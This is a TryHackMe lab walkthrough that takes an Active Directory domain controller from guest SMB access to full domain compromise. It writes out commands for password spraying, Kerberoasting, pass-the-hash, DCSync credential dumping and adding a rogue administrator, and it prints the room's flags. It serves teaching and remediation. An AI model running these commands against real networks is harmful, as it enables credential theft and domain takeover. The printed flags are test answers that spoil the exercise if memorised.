# Soupedecode01 — TryHackMe Walkthrough

**Platform:** TryHackMe  
**Room:** Soupedecode01  
**Difficulty:** Easy  
**OS:** Windows Server 2022 (Active Directory Domain Controller)  
**Attack Chain:** Guest SMB Enumeration → RID Brute-Force → Password Spraying → Kerberoasting → Backup Share Access → Pass-the-Hash → DCSync → Domain Compromise  

---

## 1. Reconnaissance

The engagement began with an Nmap scan to identify all open ports and services on the target machine. The scan confirmed the target was a Windows Active Directory Domain Controller.

```bash
sudo nmap -sCV -O <TARGET_IP>
```

**Key Findings:**

| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 135 | MSRPC |
| 139 | NetBIOS-SSN |
| 389 | LDAP |
| 445 | SMB |
| 464 | kpasswd5 |
| 593 | HTTP-RPC |
| 636 | LDAPS |
| 3268 | Global Catalog LDAP |
| 3269 | Global Catalog LDAPS |
| 3389 | RDP |
| 9389 | ADWS |

**Domain Controller Details:**
- **FQDN:** `DC01.SOUPEDECODE.LOCAL`
- **Domain:** `SOUPEDECODE.LOCAL`
- **NetBIOS Name:** `DC01`

The `/etc/hosts` file was updated accordingly:

```bash
echo "<TARGET_IP> DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL DC01" | sudo tee -a /etc/hosts
```

No web application was running on the target, indicating the room focuses purely on Active Directory enumeration and attacks.

---

## 2. Enumeration — Guest Access & RID Brute-Force

### 2.1 Guest SMB Access

Anonymous SMB enumeration confirmed that the **Guest** account was enabled and allowed authentication with an empty password:

```bash
nxc smb <TARGET_IP> -u guest -p ''
```

**Result:**
```
[+] SOUPEDECODE.LOCAL\guest:
```

### 2.2 Share Enumeration

With Guest access, the available SMB shares were enumerated:

```bash
nxc smb <TARGET_IP> -u guest -p '' --shares
```

**Shares Identified:**

| Share | Permissions |
|-------|-------------|
| ADMIN$ | – |
| backup | – |
| C$ | – |
| IPC$ | READ |
| NETLOGON | – |
| SYSVOL | – |
| Users | – |

The Guest account only had READ access to `IPC$`, but this was sufficient for RID brute-force enumeration.

### 2.3 RID Brute-Force — Domain User Enumeration

Using the Guest account, a RID brute-force was performed to extract all domain objects:

```bash
nxc smb <TARGET_IP> -u guest -p '' --rid-brute 3000 | tee rid_brute.txt
```

This revealed **over 600 user accounts**, including service accounts and computer accounts. The output was parsed to extract usernames:

```bash
grep 'SOUPEDECODE\\' rid_brute.txt | cut -d':' -f2- | sed -E 's/.*SOUPEDECODE\\(.*) \(SidType.*/\1/' | grep -v '\$' | sort -u > users.txt
```

**Key accounts identified:**
- `file_svc` (RID 1133) — Service account
- `charlie` (RID 1134) — Non-standard username
- `firewall_svc` (RID 2163)
- `backup_svc` (RID 2164)
- `web_svc` (RID 2165)
- `monitoring_svc` (RID 2166)
- `admin` (RID 2168)
- `ybob317` (RID 1132)

---

## 3. Initial Access — Password Spraying

### 3.1 Username-as-Password Spray

With a complete user list, the next step was password spraying. Since no specific password was provided, the "username as password" technique was attempted against all accounts using Kerbrute:

```bash
kerbrute passwordspray --domain SOUPEDECODE.LOCAL --dc <TARGET_IP> --user-as-pass users.txt
```

Alternatively, with NetExec:

```bash
nxc smb <TARGET_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

**Result:**
```
SOUPEDECODE.LOCAL\ybob317:ybob317
```

A valid credential pair was discovered: **`ybob317:ybob317`**

---

## 4. Lateral Movement — Authenticated Enumeration

### 4.1 Share Enumeration with ybob317

With valid credentials, SMB shares were re-enumerated:

```bash
nxc smb <TARGET_IP> -u ybob317 -p 'ybob317' --shares
```

The **`Users`** share was now accessible. Connecting and exploring:

```bash
smbclient //<TARGET_IP>/Users -U ybob317
```

Navigating to `ybob317\Desktop` revealed the user flag:

```bash
cd ybob317\Desktop
more user.txt
```

**User Flag:** `28189316c25dd3c0ad56d44d000d62a8`

### 4.2 Kerberoasting

With valid credentials, Kerberoasting was performed to extract service account tickets:

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip <TARGET_IP> -request -outputfile roasted.txt
```

The extracted TGS hash was cracked using John the Ripper:

```bash
john roasted.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```

The cracked password belonged to the **`file_svc`** account:

**Recovered Credentials:**
```
file_svc : Password123!!
```

---

## 5. Privilege Escalation — Backup Share & Pass-the-Hash

### 5.1 Accessing the Backup Share

With the `file_svc` credentials, the previously inaccessible **`backup`** share was now accessible:

```bash
smbclient //<TARGET_IP>/backup -U file_svc
```

Inside, a file named **`backup_extract.txt`** was found. This file contained NTLM hashes for domain accounts:

```bash
more backup_extract.txt
```

**Extracted hashes included:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
...
```

### 5.2 Extracting Hashes for Pass-the-Hash

The usernames and NTLM hashes were extracted into separate files:

```bash
cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
cut -d: -f4 backup_extract.txt > ntlm-hashes.txt
```

Computer accounts, `admin`, and `Administrator` were added to the user list, and a Pass-the-Hash spray was performed:

```bash
nxc smb <TARGET_IP> -u extracted_users.txt -H ntlm-hashes.txt -d SOUPEDECODE.LOCAL --no-bruteforce --continue-on-success
```

**Result — Valid Hash Found:**
```
SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559
```

The machine account **`FileServer$`** was over-privileged on the Domain Controller.

### 5.3 Accessing the C$ Share

Using the `FileServer$` hash, the C drive of the Domain Controller was accessed:

```bash
smbclient //<TARGET_IP>/C$ -U 'FileServer$' --pw-nt-hash e41da7e79a4c76dbd9cf79d1cb325559 -W soupedecode.local
```

Navigating to the Administrator's desktop:

```bash
cd /Users/Administrator/Desktop
more root.txt
```

**Root Flag:** `27cb2be302c388d63d27c86bfdd5f56a`

---

## 6. Post-Compromise — DCSync & Full Domain Control

### 6.1 DCSync as FileServer$

Since `FileServer$` had extensive privileges, DCSync was attempted to dump all domain credentials:

```bash
impacket-secretsdump 'soupedecode.local/FileServer$@<TARGET_IP>' -hashes :e41da7e79a4c76dbd9cf79d1cb325559 -just-dc
```

**Result:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
```

The `FileServer$` account had DCSync rights, allowing full domain credential extraction.

### 6.2 Full Administrative Access

Using the Administrator's NTLM hash, a SYSTEM-level shell was obtained via `wmiexec`:

```bash
impacket-wmiexec soupedecode.local/Administrator@<TARGET_IP> -hashes aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f
```

A new administrative user was created for persistence:

```powershell
net user Mishky Password123 /add
net localgroup administrators Mishky /add
```

RDP access was obtained (though the VM was running Windows Server 2022 without the GUI):

```bash
xfreerdp /v:<TARGET_IP> /u:Mishky /p:Password123 /dynamic-resolution
```

---

## 7. Flags

| Flag | Value |
|------|-------|
| **User Flag** | `28189316c25dd3c0ad56d44d000d62a8` |
| **Root Flag** | `27cb2be302c388d63d27c86bfdd5f56a` |

---

## 8. Security Findings & Recommendations

### Key Findings

| Finding | Impact |
|---------|--------|
| Guest account enabled with empty password | Allowed anonymous SMB enumeration and RID brute-force |
| Weak password policy (username-as-password) | Enabled rapid credential discovery |
| Kerberoastable service accounts | Allowed offline cracking of service credentials |
| Sensitive NTLM hashes stored in backup share | Allowed Pass-the-Hash attacks |
| Over-privileged machine account (FileServer$) | Enabled DCSync and full domain compromise |
| DCSync rights granted to non-admin account | Allowed extraction of all domain hashes |

### Remediation Recommendations

1. **Disable Guest Account:** Ensure the Guest account is disabled and cannot be used for anonymous enumeration.
2. **Enforce Strong Password Policies:** Prevent username-as-password patterns with complexity requirements and regular password audits.
3. **Secure Service Accounts:** Use Group Managed Service Accounts (gMSAs) with 240-character random passwords for Kerberoastable accounts.
4. **Restrict Sensitive Data in Shares:** Never store NTLM hashes, credential dumps, or backup files in accessible SMB shares.
5. **Apply Least Privilege:** Remove DCSync rights from non-administrative accounts and machine accounts.
6. **Monitor for DCSync:** Alert on DCSync replication requests from non-DC accounts.

---

## 9. Tools Utilized

| Tool | Purpose |
|------|---------|
| **Nmap** | Port scanning and service enumeration |
| **NetExec (nxc)** | SMB/LDAP enumeration, RID brute-force, password/hash spraying |
| **Kerbrute** | Password spraying and user enumeration |
| **smbclient** | SMB share exploration and file retrieval |
| **Impacket (GetUserSPNs)** | Kerberoasting |
| **John the Ripper / Hashcat** | Offline password cracking |
| **Impacket (secretsdump)** | DCSync and credential dumping |
| **Impacket (wmiexec/smbexec)** | Remote command execution |
| **xfreerdp** | RDP access |

---

## 10. Conclusion

Soupedecode01 is an excellent beginner-friendly Active Directory room that covers a realistic attack chain from initial enumeration to full domain compromise. The room emphasizes the importance of enumeration — starting from a simple Guest account and RID brute-force, progressing through password spraying and Kerberoasting, and culminating in Pass-the-Hash and DCSync. The misconfigurations highlighted (weak passwords, over-privileged machine accounts, sensitive data in shares) are common in real-world enterprise environments, making this room a valuable learning experience for anyone pursuing AD penetration testing skills.
